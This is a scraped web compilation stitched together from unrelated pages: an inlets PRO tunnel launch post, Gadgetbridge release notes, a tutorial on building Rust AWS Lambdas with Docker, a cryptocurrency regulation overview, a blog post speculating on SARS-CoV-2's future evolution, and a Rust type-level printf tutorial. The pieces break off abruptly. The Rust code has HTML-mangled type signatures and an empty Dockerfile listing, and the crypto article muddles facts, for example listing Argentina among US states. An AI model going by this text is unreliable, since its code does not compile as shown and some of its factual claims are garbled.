<li><a href="https://blog.brewsterops.dev/post/inlets-pro-homelab/">Inlets Pro Homelab Awesomeness</a> by Matt Brewster</li>
</ul>
<p>Most enterprise companies, it turns out have some legacy deployed on premises, and some deployed on a public cloud. They need to securely tunnel services from the private cluster to the public one, but they do not want to expose them on the Internet. Sometimes these services are also running without encryption, think of an ancient MSSQL service, that's full of key data for an API.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-split-plane.png" alt="Split plane, headless tunnel"></p>
<p>inlets PRO provided a way for them to replace VPNs, which were complex to set up and manage. It also provided a way for the data to be encrypted over the wire, and only tunneled to the remote network, not being exposed. Think of it like a private or headless tunnel, maybe a "hybrid service mesh."</p>
<p>inlets PRO works much like the original open source version and shares some code. The inletsctl and inlets-operator projects both have switches to use the PRO version of inlets.</p>
<h2 id="launchday">Launch day</h2>
<p>This journey started out as building an open-source tunnel to help developers get past the impasse of using severely-limited SaaS tunnels. The tooling that has developed subsequently, with help from the community, has made inlets even more useful and easy to use.</p>
<p>Today is about making inlets more sustainable as an option over the long-haul. It's about providing clear business value to companies and teams that have hybrid cloud, are tired of VPNs, or that simply need to work with customers and clients on other networks.</p>
<p>With the launch of the <a href="https://inlets.dev/">landing page for inlets PRO</a> you'll find a personal pricing option that gives unlimited use, a commercial option, and enterprise. The commercial option is not billed per month, because to keep inlets PRO completely private, there is no tracking included. Users are trusted to buy the right license for what they are using, and in return, no usage or tracking data will be collected.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Gadgetbridge 0.46.0 has been release and after a whole week of waiting it
landed in F-Droid.</p>
<p>This release, which adds TLW64 support contributed by Erik Bloß, also has
support for the new Mi Band 5, which is basically runnig on the Mi Band 4 code.</p>
<p>On the Huami front there are fixes for GTR/GTS activity data on newer
firmware version. There seems to be extra data which we ignore for now to make
the current code run with it. In the future we will look at making use of
the new data which unfortunately would need a new database schema.</p>
<p>Another quite big changes was contributed by Taavi Eomäe, who refactored the
device discovery activity which fixes tons of bugs and also new features,
like displaying already paired devices an notes about devices needing a
pairing key.</p>
<p>The release 0.45.0 did not have its own blog post, please refer to the list below
for details on what changed with the 0.45.0 and 0.45.1 releases.</p>
<p>But there is one thing I would like to highlight. There is a new,
experimental way of getting weather data from an new open source app developed
by Pawel Dube, that directly supports Gadgetbridge. No need for API keys.
The App is still alpha and work in progress, but we highly recommend trying it.
<a href="https://codeberg.org/Starfish/TinyWeatherForecastGermany">TinyWeatherForecast</a>
Don't be fooled by the name it supports a lot of locations worldwide.
If you like it please give it a star on Codeberg.org!</p>
<p>For all user-facing changes since the previous blog post, check the following list:</p>
<h4>0.46.0</h4>
<ul>
<li>Initial support for Mi Band 5</li>
<li>Initial support for TLW64</li>
<li>Amazfit GTR/GTS: Fix broken activity data on newer firmwares</li>
<li>Big refactoring of the device discovery activity (See PR #1927 description for details)</li>
<li>Add about screen</li>
<li>New icon for Amazfit Bip</li>
<li>Avoid duplicated entries in preferred media player selection</li>
<li>Avoid a lot of crashes and improve error handling in various places</li>
</ul>
<h4>0.45.1</h4>
<ul>
<li>Amazfit GTR/GTS: Fix connection issue with latest firmwares (probably other Huami devices also affected)</li>
<li>Add experimental support for TinyWeatherForecastGermany</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure id="w-node-c687bec1ed8c-01d6604b"><p><img src="https://assets.website-files.com/56d31f469aaa616f5089a267/5f23ffebdba110f2cab1d06d_Rust%20Lambda.png" alt=""></p></figure><div><p>Update:&nbsp;Join the discussion over at <a href="https://news.ycombinator.com/item?id=24154506">HackerNews</a>! </p><p>We’ve written in the past about how the CV Partner web application is written in Ruby on Rails. The web application isn’t the whole story, though. Surrounding it are many supporting services, and we are increasingly using Rust to write these services.</p></div><p>We’re also using more Lambdas in our architecture, and we want to use Rust in those as well. The landscape for Rust lambdas isn’t barren, but it’s not well-trodden either.<br></p><p>This post is going to cover how we write, build, and deploy our Rust lambdas. Our lambdas have the following qualities that we’re proud of and want to share with you:<br></p><ol role="list"><li><strong>Fast, standardised build.</strong> All of our lambdas use the same Dockerfile to build, and make good use of Docker’s layer caching. Incremental builds in CI take under a minute.</li><li><strong>Run locally. </strong>If you’re working on a lambda, you don’t want to have to sit through a CI build to see if your changes work. All of our lambdas can run locally and in AWS using the same code.</li><li><strong>Private GitHub dependencies. There aren’t many options out there for private Cargo repositories, so we use private GitHub repositories for our internal libraries.</strong></li></ol><h2>The code<br></h2><p>The starting point for writing a Lambda in Rust is to use the official <a href="https://github.com/awslabs/aws-lambda-rust-runtime">Rust lambda runtime</a>. At the time of writing, the last release of this library is version 0.2, which doesn’t support async/await. Async/await support is present in master, though. Here’s how it looks in practice:</p><div><pre><code>
use lambda::{lambda, Context};
use serde_json::Value;

type Error = Box<dyn std::error::error="" +="" send="" sync="" 'static="">;

#[lambda]
#[tokio::main]
async fn main(event: Value, _: Context) -&gt; Result<value, error=""> {
    Ok(event)
}

</value,></dyn></code></pre></div><p>The problem with this is that you can’t run it locally. The #[lambda] attribute wraps your main function in another main function that calls in to the AWS lambda API.<br></p><p>To get around this, we write two main functions:<br></p><div><pre><code>

#[cfg(feature = "with-lambda")]
use lambda::{lambda, Context};
use serde::{Deserialize, Serialize};

type Error = Box<dyn std::error::error="" +="" send="" sync="" 'static="">;

#[derive(Deserialize, Debug)]
struct Input {
    name: String
}

#[derive(Serialize, Debug)]
struct Output {
    greeting: String
}

async fn handler(input: Input) -&gt; Result<output, error=""> {
    Ok(Output { greeting: format!(“Hello, {}!”, input.name) })
}

#[cfg(feature = "with-lambda")]
#[lambda]
#[tokio::main]
async fn main(input: Input, _: Context) -&gt; Result<output, error=""> {
    handler(input).await
}

#[cfg(not(feature = "with-lambda"))]
#[tokio::main]
async fn main() -&gt; Result&lt;(), Error&gt; {
    let input_str = std::env::args().nth(1);
    if input_str.is_none() {
        panic!(
            "you must pass an input parameter as the first argument, and it must be a JSON string"
        );
    }
    let input = serde_json::from_str(&amp;input_str.unwrap())?;
    let output = handler(input).await?;
    println!("{}", serde_json::to_string(&amp;output)?);
    Ok(())
}

</output,></output,></dyn></code></pre></div><p>We’re making use of Rust’s “feature” flags to compile a different harness around the handle function depending on whether we want to run locally or in AWS.</p><p>Here’s the Cargo.toml file:</p><div><pre><code>
[package]
name = "rust-lambda-template"
version = "0.1.0"
authors = ["Sam Rose <sam@cvpartner.com>"]
edition = "2018"

[dependencies]
lambda = { git = "https://github.com/awslabs/aws-lambda-rust-runtime/", rev = "c8dbcd39e0b1cf9ecf395e2b2f9df6c6c0d97780" }
tokio = { version = "0.2", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_derive = "1"
serde_json = "1"

[features]
with-lambda = []

</sam@cvpartner.com></code></pre></div><p>Two noteworthy things:<br></p><ol role="list"><li>We’re using a version of the aws-lambda-rust-runtime that hasn’t officially been released. This isn’t ideal, and we’re eagerly awaiting a 0.3 release.</li><li>We have a features section, which is where we define the with-lambda feature we use in the Rust code shown above.<br></li></ol><p>Running our lambda now gives us the following:</p><div><pre><code>
$ cargo run -- ‘{ “name”: “Sam” }’
{ “message”: “Hello, Sam!” }

</code></pre></div><h2><strong>The Dockerfile</strong></h2><p>All of our lambdas build with the same Dockerfile. I’ll show it in all of its glory and then explain what’s going on bit by bit. Brace yourself.</p><div><pre><code>

</code></pre></div><p>First of all, shout out to Shane Utt whose <a href="https://shaneutt.com/blog/rust-fast-small-docker-image-builds/">blog post</a> we used as a starting point for this.<br></p><p>The first line is a Docker directive that says we want to use some experimental Dockerfile syntax. The syntax in question is the --mount=type=ssh flag to the RUN commands, but we’ll talk about later.</p><div><pre><code>
FROM rust:latest as cargo-build
ARG name

</code></pre></div><p>This next bit says we want to use the latest Rust image, and we’re passing in a build arg called “name.” This is how we’re able to share this Dockerfile between all of our lambdas without having to modify it.</p><div><pre><code>
RUN apt-get update
RUN apt-get install musl-tools -y
RUN rustup target add x86_64-unknown-linux-musl

</code></pre></div><p>Next we run an update on the image, and we install <a href="https://musl.libc.org/">musl</a>. If you’re not familiar, musl is a libc replacement that you can link to statically. This means the resulting binary won’t depend on the system’s libc, which makes it more portable. It’s not a strict requirement for running on AWS Lambda, but it’s good practice.</p><div><pre><code>
WORKDIR /usr/src/${name}
COPY Cargo.toml Cargo.toml
RUN mkdir src/
RUN echo "fn main() {println!(\"if you see this, the build broke\")}" &gt; src/main.rs

</code></pre></div><p>The next few lines set up a pseudo project, where the only things we’re going to compile are our dependencies and a dummy main.rs. The idea behind this is to use Docker’s layer caching to avoid having to compile our dependencies every build. This leads to significantly faster incremental builds in Docker.</p><div><pre><code>
RUN mkdir -p $HOME/.ssh
RUN ssh-keyscan github.com &gt; $HOME/.ssh/known_hosts
RUN test "$(cat $HOME/.ssh/known_hosts | ssh-keygen -lf -)" = "2048 SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 github.com (RSA)"

</code></pre></div><p>Up until now, we’ve done exactly what Shane Utt did in his version of this. These three lines, though, are new. Because we use SSH to fetch private dependencies (more on this later), we would sometimes find that our builds would fail with the error “host key verification failed.” To get around that we pull down GitHub’s host keys and make sure they’re what we expect them to be based on the values <a href="https://docs.github.com/en/github/authenticating-to-github/githubs-ssh-key-fingerprints">here</a>.</p><div><pre><code>
RUN mkdir -p $HOME/.ssh
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

</code></pre></div><p>Our first bit of experimental syntax! The --mount flag is a new thing introduced with the BuildKit engine for Docker, you can read about it in depth <a href="https://medium.com/@tonistiigi/build-secrets-and-ssh-forwarding-in-docker-18-09-ae8161d066">here</a>. The type=ssh bit is us telling Docker that we want to use an SSH agent for this command. In the docker build invocation, which we’ll see later, we can tell Docker what keys to add to this SSH agent.</p><p>The reason we do this is because it was the only way we could find that let us depend on private GitHub repositories in our Cargo.toml file, in a way that worked both locally and in CI. It means we can do this in our Cargo.toml file:</p><div><pre><code>
[dependencies]
private-library = { git = "ssh://github.com/cvpartner/private-library", tag = "1.0" }

</code></pre></div><p>And it Just Works<strong>™</strong>.</p><p>The rest of the RUN command is our first cargo build. It looks a lot scarier than it is. Most of it is us telling rustc to link against musl instead of the default libc. The only other interesting bit is the --features with-lambda. This matches up with the code we saw earlier to produce a binary that’s going to work properly when deployed in AWS.</p><div><pre><code>
RUN rm src/main.rs
COPY src/* src
RUN touch src/**
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo test --features with-lambda --release --target=x86_64-unknown-linux-musl
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

</code></pre></div><p>Next up, we’re copying over our actual source code. The touch command is necessary for cargo to realise the files are new, because when we created our dummy main.rs file earlier we created a new file with a timestamp later than the one on the real main.rs file. This is different to the approach taken by Shane Utt, as we found that approach would often result in builds where the dummy main.rs file was the one that ended up in the final build.</p><p>Another addition is the cargo test invocation. Tests are good!</p><div><pre><code>
FROM alpine:latest
ARG name
COPY --from=cargo-build /usr/src/${name}/target/x86_64-unknown-linux-musl/release/${name} /usr/local/bin/${name}

</code></pre></div><p>Lastly we create a new build stage and copy over the final executable. The new build stage is in order to keep the final image small. Ours tend to clock in at around 8MB.<br></p><h2><strong>The build script</strong><br></h2><p>Invoking Docker is done in a shell script which is also identical for all of our lambdas.</p><div><pre><code>
#!/usr/bin/env bash

set -e
set -x

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &amp;&amp; pwd )"
cd $DIR

NAME=$(cat Cargo.toml | grep "name" | head -n 1 | sed -E 's/name = "(.*)"/\1/')
DOCKER_NAME="cvpartner/$NAME"

if [[ -z $BUILD_ID ]];
then
  TAG=$DOCKER_NAME
  SSH="--ssh default"
else
  TAG="our.private.docker.registry/$DOCKER_NAME"
  SSH="--ssh default=/home/ci/.ssh/id_rsa"
fi

DOCKER_BUILDKIT=1 docker build $SSH --cache-from $TAG …</code></pre></div></div></div>

</article>

<section><div><div><div><div><div><h2>Introduction</h2>
	<div>
		<p><span>Cryptocurrencies in America are not considered legal tender. However, Cryptocurrency exchanges are legal and the regulations vary by state. In this article, we will be discussing the entire regulation and taxation situation in the US, along with state laws that pertain to Cryptocurrency and blockchain technology. Let’s get started!</span></p>
	</div>
<h2>Cryptocurrency Regulation Outlook</h2>
	<div>
		<div>
			<p><span>It is quite overwhelming to find a reliable lawful approach to Cryptocurrencies in the US. Every law that is governing&nbsp;</span><a href="https://www.espay.exchange/centralized-exchange-solutions"><b>centralized crypto exchanges</b></a><span>&nbsp;varies by state. Moreover, federal authorities differ in their definition of the term – Cryptocurrency. The FinCEN (Financial Crimes Enforcement Network) doesn’t consider Cryptocurrencies to be a legal tender. However, FinCEN has been considering exchanges as money transmitters since 2013, based on the fact the tokens are other value that substitutes for currency. On the contrary, the IRS considers Cryptocurrencies as property and has issued tax regulation for that reason.&nbsp;&nbsp;</span></p>
<p><span>Regulatory laws for Cryptocurrency exchange in the US are also in an indecisive lawful territory. Many of the federal regulators allege jurisdiction. The Securities and Exchange Commission has indicated that it considers Cryptocurrencies as securities. In March 2018, SEC stated that it was seeking to apply securities laws comprehensively for exchanges and digital wallets. On the contrary, the Commodities Futures Trading Commission has adopted a friendly and do-no-harm approach, explaining Bitcoin as a commodity and permitting Cryptocurrency derivatives to buy and sell openly.&nbsp;</span></p>
<p><span>The Justice Department is working with the CFTC and SEC over future Cryptocurrency regulations to make sure that the customers are effectively protected and regulatory oversight is more streamlined. Treasury of the US has emphasized an urgent need for crypto regulation to combat domestic and global criminal activities. In January 2018, Steve Mnuchin and Treasury Secretary declared a new FSOC working group to look at the progressively more crowded Cryptocurrency marketplace.</span></p>
<p><span>In June 2015, New York managed to become the first state of the US to regulate virtual currency companies via state agency rulemaking. In 2019, there were 32 states of the US that introduced legislation accepting or encourage the utilization of Bitcoin and blockchain distributed ledger technology (DLT). A few states passed them into law. However, some of them established task forces to revise the further use of technology. In 2017, the FTC gave LedgerX – Crypto trading platform operator in the US, permission to become the first federally regulated digital currency options exchange and clearinghouse.</span></p>

		</div>
	</div>
<h2> State Regulations Pertaining to Cryptocurrency and the Blockchain Technology</h2><h2>New York</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – In 2015, New York released the “BitLicense” that is needed by any virtual currency company serving New York business owners or residents. The New York State Department of Financial Services (NYDFS) established the BitLicense to provide guardrails that safeguard customers and root out illegal doings without stifling advantageous improvement.&nbsp; According to the legislation, any individual or company who is involved in any of the following activities in New York should obtain a BitLicense:</span></p>
<ol>
<li><span>Performing exchange services as a customer business</span></li>
<li><span>Trading virtual currency as a customer business</span></li>
<li><span>Virtual currency transmission</span></li>
<li><span>Issuing, controlling or administering a virtual currency</span></li>
<li><span>Maintaining custody of virtual currency on the behalf of others</span></li>
</ol>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best Place for License – Yes, BitLicense can be acquired by following simple instructions in New York</span></p>

		</div>
	</div>
<h2>Washington State</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – In December 2014, the DFI in Washington State formed the Emerging Payments Task Force during the annual conference of State Bank Supervision (CSBS). In September 2015, the annual conference of State Bank Supervision released a model regulatory platform for virtual currencies.&nbsp;</span></p>
<p><span>According to the Washington State’s government, virtual currencies are considered as a digital currency or Cryptocurrency. Virtual currencies are the medium of exchange not adopted by a government. In December 2014, Bitcoin was added to the definition of Money Transmission. Every virtual currency in the state of Washington is subject to the UMSA – Uniform Money Services Act.</span></p>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – Yes</span></p>
<p><span>Is it best Place for License – Yes, Washington has generated a multi-state licensing program to make it easy for companies to comply with crypto regulations.</span></p>

		</div>
	</div>
<h2>California</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – The legislature of California is working on a new set of regulations specifically designed for virtual currencies and inspired by the New York BitLicense. In February 2017, the Virtual Currency Act was a bill proposed to the California Legislature. The Assembly Bill was released by the Legislature in August 2016. Just like the New York BitLicense, already established banks would not be needed to apply for the California Virtual Currency License if they want to involve themselves in the activities of the Cryptocurrency business. Nonetheless, the bill will be needed for any new businesses that lack a bank charter.</span></p>
<p><span>This bill would prohibit an individual from involving in any virtual currency business, as defined, in California unless the individual is licensed by the Commissioner of Business Oversight or is exempt from the licensure prerequisite, as provided. This bill will also need applicants for licensure, including an applicant for licensure and approval to get control of a licensee, in order to pay the commissioner a nonrefundable application fee and finish an application form, amongst other things, prior virtual currency services offered by the applicant, detail of the applicant, a sample form of receipt for transactions concerning the virtual currency business, and specified financial statements.&nbsp;</span></p>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best Place for License – No, it’s too early to create a license on Bitcoin and other virtual currencies since they are still in the earliest stages of development.</span></p>

		</div>
	</div>
<h2>Argentina</h2>
	<div>
		<div>
			<p><span>According to the National Constitution of this country, the only authority that is able to issue legal currency is the Central Bank. Bitcoins are not lawful currency strictly speaking, as they are not issued by the monetary authorities of the government and are not a legal tender.&nbsp;</span></p>
<p><span>Hence, they can be considered money but not legal currency. They are not an essential means of cancelling debts or obligations.&nbsp;</span></p>
<p><span>Even though Bitcoins are not certainly regulated, they are increasingly being used in this country that has strict controls over foreign currencies. According to some professionals, a bitcoin can be considered a good or a thing under the civil code, and transactions related to Bitcoins can be governed by the rules of the sale of products under the civil code. The latest amendment to the Income Tax Law provides that the gain derived from the sale of digital currency will be considered income and taxed as such.&nbsp;</span></p>
<p><span>Trading Ban –No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best place for License – No</span></p>
<p><span>Crypto Regulatory Sandbox – currently, there are no such crypto sandboxes that are designed to promote investment and research in Cryptocurrency in Argentine. Except for the taxation and anti-money laundering regulations, the regulatory authorities have adopted a wait-and-see tactic in regarding to cryptocurrencies. However, the Central Bank has created several research groups – amongst which there are a few groups dedicated to cryptocurrencies and Blockchain technologies.</span></p>

		</div>
	</div>
<h2>Cryptocurrency Taxation Outlook of America</h2>
	<div>
		<div>
			<p><span>In October 2019, the US Internal Revenue Service (IRS) issued new guidelines on the tax treatment of virtual currency willing to assist taxpayers to understand tax and reporting obligations for transactions including virtual currency, along with tax treatment of “hard fork” transactions.</span></p>
<p><span>In the same year, the IRS also released a draft of Schedule 1 to Form 1040. That draft would need taxpayers to answer whether they had any virtual currency-related transactions during the tax year.</span></p>
<p><span>The guidelines issued by IRS and the proposed amendment of Schedule 1 Form part of the Virtual Currency Compliance Campaign of the IRS that was initiated in July 2018 and emphasizes that the tax outcomes of Cryptocurrency or virtual currency transactions are a focal point for the IRS.</span></p>
<p><span>The new guidelines also mention that the income tax treatment of certain transactions that are unique to Cryptocurrency, for example, airdrops and hard forks.</span></p>
<p><span>According to the new guidance issued by the IRS:</span></p>
<ul>
<li><span>A person who is paying tax does not recognize gross income as an outcome of the hard fork of the Cryptocurrency owned by the taxpayer if that person does not receive units of new Cryptocurrency.</span></li>
<li><span>A person who is paying tax does recognize gross income, ordinary in character, as an outcome of an airdrop of new Cryptocurrency following a hard fork if the person who is paying tax receives units of Cryptocurrency. The total amount of the gross income to be recognized is the fair market value of the new Cryptocurrency.</span></li>
<li><span>If the person who is paying tax is capable of selling, transferring, or exchanging, or otherwise disposing of Cryptocurrency, which will be the case once the Cryptocurrency is recorded in the distributed ledger of the taxpayer, then the taxpayer has the vital extent of control and dominion.</span></li>
<li><span>In cases where the ledger of the taxpayer at a Cryptocurrency exchange does not get credited due to the reason that the exchange does not yet favors the new Cryptocurrency, the person who is paying tax does not have dominion until the new Cryptocurrency is accredited.&nbsp;</span></li>
</ul>

<div><figure><img src="https://www.virology.ws/wp-content/uploads/2020/02/coronavirus-300x261.png" alt="coronavirus" srcset="https://www.virology.ws/wp-content/uploads/2020/02/coronavirus-300x261.png 300w, https://www.virology.ws/wp-content/uploads/2020/02/coronavirus.png 722w" sizes="(max-width: 300px) 100vw, 300px"></figure></div>


<p>What does the future hold for SARS-CoV-2? Will it remain in its current configuration, with 20% of infections causing serious damage? Will everyone on Earth need to be vaccinated regularly to prevent infection? Allow me to indulge in some speculation and suggest that SARS-CoV-2 will eventually become the fifth common cold coronavirus (CoV).</p>
<p>There are five CoV that regularly cause mild upper respiratory tract infections in most humans. Called OC43, HKU1, 229E and NL63, they infect children in their first years of live and cause little disease. Immunity wanes within a year and reinfections occur regularly, but with little consequence.</p>
<p>OC43, HKU1, 229E and NL63 were originally viruses that infect bats and rodents. Hundreds of years ago these viruses spilled over into humans and eventually became the viruses we know today. It is likely that the initial emergence of these viruses from bat and rodent reservoirs led to epidemics that were not noticed. There was no medicine or science or public health to record such epidemics, and given the much smaller human population, they likely spread slowly and were not noticed amid the generally poor state of human health.</p>
<p>It is likely that since their emergence hundreds of years ago, OC43, HKU1, 229E and NL63 slowly underwent change and became less pathogenic for humans. I base this assumption on the fact that contemporary spillovers of CoVs have led to serious disease in humans. In 2003, SARS-CoV emerged from bats into humans and caused severe atypical respiratory disease; however we were able to eradicate this virus after only 8000 known human infections. In 2013, MERS-CoV emerged from camels into humans, but this virus has never been able to establish itself in humans. Every small outbreak is, for the most part, the consequence of a new spillover of virus from camels into humans. These short chains of infection eventually terminate.</p>
<p>However in late 2019 SARS-CoV-2 emerged from bats into humans and established itself as a human virus. It transmits very well among humans and because 80% of infections are mild, it spreads silently. The more serious infections that require hospitalization contribute little to transmission of the virus in the human population. Indeed, these seriously ill patients have problems because their own immune response has gone awry. SARS-CoV-2 is no longer their problem.</p>
<p>It seems likely that with time, SARS-CoV-2 will change so that infected patients no longer develop serious disease. This assumption is based on the fact that causing serious disease is absolutely not required for virus transmission. As the virus moves through humans over the years, its genome will slowly accumulate mutations as a consequence of error-prone replication. Some of these mutations will be lethal and cause viral replication to cease. Other mutations will be tolerated, and among these will be changes that alter the viral reproduction cycle so that serious disease no longer occurs in 20% of infected patients. Although viral reproduction in seriously ill patients is very low, it is likely that some virus-mediated event early in infection sets the stage for the later immune dysregulation. I submit that mutations will eventually accumulate in the viral genome that prevent these late sequelae.</p>
<p>There is good reason to think that SARS-CoV-2 will eventually lose the ability to cause serious disease. The main selective force for viral evolution is transmission; little else matters (viruses can be selected to become drug resistant but such events play a minuscule role in the bigger scheme of viral evolution). Put another way, there is simply no selective advantage for the virus to remain pathogenic as this property contributes nothing to transmission. With no selection to maintain pathogenicity, SARS-CoV-2 will eventually become benign. It will become the fifth common cold CoV.</p>
<p>Why does SARS-CoV-2 cause severe disease in 20% of infected people? Recall that the ancestors of this virus originated in bats where have likely circulated for many thousands of years. These viruses became well adapted to their bat hosts, such that they replicated efficiently and were transmitted effectively to new hosts. Their genome had evolved to co-exist with the unusual immune system of bats, which is tuned to deal with the damage caused by high oxygen usage during flight. Then one day late in 2019 one of these viruses encounters a human host. It replicates well in that host but in the face of a very different immune response, problems such as cytokine storms arise. It will be some years before the genome of SARS-CoV-2 changes sufficiently so that it no longer triggers aberrant immune reactions in the human host.</p>
<p>How long it will take before SARS-CoV-2 changes sufficiently to become common cold CoV #5 is unknown. It depends in part on how well the experimental vaccines currently under development work. I suspect that none of these vaccines will completely block viral reproduction, although they may mitigate disease. Consequently SARS-CoV-2 will continue to circulate and the mutations that will eventually reduce its virulence will arise. I do think that at one day in the future we will no longer need any of the SARS-CoV-2 vaccines that are currently in development, because the virus will no longer cause serious disease. For this reason we do not have vaccines against the four common cold CoVs – there is no medical need for them.</p>
<p>To put this another way, here we have a pandemic virus whose emergence could have been stopped had we invested a few billion dollars in development of pan-CoV antiviral drugs. Instead, many companies and governments are spending billions of dollars to develop vaccines that will one day be obsolete. This lack of vision should infuriate every human on Earth.</p>
<p>Pandemic viruses will continue to emerge from animal reservoirs in the coming years. Will we be ready for them? I doubt it.</p>				</div></div>]]>

    &nbsp; — &nbsp;
    June 21, 2020
  </p>
  <p>I show how to use heterogeneous lists and traits to implement a type-safe printf in Rust. These mechanisms can ensure that two variadic argument lists share important properties, like the number of format string holes matches the number of printf arguments.</p>
  <p><em>Part of an ongoing series about type-level programming in Rust. Consider reading <a href="http://willcrichton.net/notes/type-level-programming/">part one</a> first! All code in this note can be found in <a href="https://gist.github.com/willcrichton/e7fcf1b0e84b4be7f172f0e0245cf149">this gist</a>.</em></p>

<p>Rust has a great printf function, <a href="https://doc.rust-lang.org/std/macro.println.html"><code>println!</code></a>. It has a rich formatting language, but also catches mistakes at compile-time. For example, <code>println!</code> will check that the number of arguments matches the number of holes in the format string:</p>

<div><div><pre><code>error: 2 positional arguments in format string, but there is 1 argument

36 |   println!("{} {}", "Hello");
</code></pre></div></div>

<p>How does the Rust compiler make this check? Because both the format string and the argument are within the macro, Rust will check that the number of holes matches the number of arguments. Consequently, format strings <em>have</em> to be within the macro. If we write:</p>

<div><div><pre><code><span>let</span> <span>s</span> <span>=</span> <span>"{} {}"</span><span>;</span>
<span>println!</span><span>(</span><span>s</span><span>,</span> <span>"hi"</span><span>)</span>
</code></pre></div></div>

<p>This code fails to compile with the error:</p>

<div><div><pre><code>error: format argument must be a string literal
  --&gt; src/printf.rs:42:12
   |
42 |   println!(s, "hi");
</code></pre></div></div>

<p>I’ll show you how to implement type-safe printf without using procedural macros. More generally, this note contains a Rust recipe for functions where:</p>

<ol>
  <li>Arguments are variadic</li>
  <li>Each argument can be a different type (<code>Vec&lt;T&gt;</code> not allowed)</li>
  <li>Multiple variadic inputs share a parallel property, e.g. the number of arguments should match the number of format holes</li>
</ol>

<h2 id="core-mechanism-hlist">Core mechanism: HList</h2>

<p>First, we need to understand the main type-level mechanism: a heterogeneous list (or H-list). An H-list is a sequence of values of potentially different types. For example, <code>[1, "a", true]</code> is an H-list, but not a valid Rust vector. H-lists are implemented in Rust using a linked-list style:</p>

<div><div><pre><code><span>struct</span> <span>HNil</span><span>;</span>
<span>struct</span> <span>HCons</span><span>&lt;</span><span>Head</span><span>,</span> <span>Tail</span><span>&gt;</span> <span>{</span>
  <span>head</span><span>:</span> <span>Head</span><span>,</span>
  <span>tail</span><span>:</span> <span>Tail</span>
<span>}</span>

<span>let</span> <span>example</span><span>:</span> <span>HCons</span><span>&lt;</span><span>i32</span><span>,</span> <span>HCons</span><span>&lt;</span><span>bool</span><span>,</span> <span>HNil</span><span>&gt;&gt;</span> <span>=</span>
  <span>HCons</span><span>{</span><span>head</span><span>:</span> <span>1</span><span>,</span> <span>tail</span><span>:</span> <span>HCons</span><span>{</span><span>head</span><span>:</span> <span>true</span><span>,</span> <span>tail</span><span>:</span> <span>HNil</span><span>}};</span>
</code></pre></div></div>

<p>The key idea is that the type of an H-list changes every time you make a change to it. By contrast, if you push to a <code>Vec&lt;T&gt;</code>, the type of the vector stays the same.</p>

<p>Just like Rust has <code>vec![]</code>, we can use the <a href="https://github.com/lloydmeta/frunk#hlist">frunk</a> crate to get an <code>hlist!</code> macro.</p>

<div><div><pre><code><span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span><span>1</span><span>,</span> <span>true</span><span>];</span> <span>// same as above</span>
</code></pre></div></div>

<h2 id="setting-up-printf">Setting up printf</h2>

<p>Let’s go back to the ingredients of printf. We need a format string and an argument list. The key idea is to represent both with an H-list, and carefully use Rust’s traits to ensure our desired property: the number of arguments should match the number of holes.</p>

<p>First, to represent format strings, we will have a sequence of structs that represent each part of the string.</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>FString</span><span>(</span><span>&amp;</span><span>'static</span> <span>str</span><span>);</span>
<span>pub</span> <span>struct</span> <span>FVar</span><span>;</span>

<span>// Assume that we compile "Hello {}! The first prime is {}" into this code.</span>
<span>// That would be a simple syntactic transformation.</span>
<span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span>
  <span>FString</span><span>(</span><span>"Hello "</span><span>),</span> <span>FVar</span><span>,</span> <span>FString</span><span>(</span><span>"! The first prime is "</span><span>),</span> <span>FVar</span>
<span>];</span>
</code></pre></div></div>

<p>To represent arguments, we will use a matching H-list of values. For example:</p>

<div><div><pre><code><span>let</span> <span>args</span> <span>=</span> <span>hlist!</span><span>[</span><span>"world"</span><span>,</span> <span>2</span><span>];</span>
</code></pre></div></div>

<p>Then, our goal is to create a function <code>format</code> such that this is true:</p>

<div><div><pre><code><span>assert_eq!</span><span>(</span>
  <span>example</span><span>.format</span><span>(</span><span>args</span><span>),</span>
  <span>"Hello world! The first prime is 2"</span>
<span>);</span>
</code></pre></div></div>

<p>And this should be a compile-time (NOT run-time) error:</p>

<div><div><pre><code><span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"Only one arg"</span><span>]);</span>
</code></pre></div></div>

<h2 id="the-format-trait">The Format trait</h2>

<p>In the spirit of type-level computation, we start by defining a trait.</p>

<div><div><pre><code><span>trait</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span> <span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>ArgList</span><span>)</span> <span>-&gt;</span> <span>String</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here, <code>self</code> is the H-list of the format directives, and <code>ArgList</code> is the H-list of the variadic arguments. <code>Format</code> need to take <code>ArgList</code> as a type parameter, because its type will change as we remove elements from the <code>ArgList</code> list.</p>

<p>Now, we proceed to implement the <code>Format</code> trait by cases. First, the base case for reaching the end of the format list <code>HNil</code>:</p>

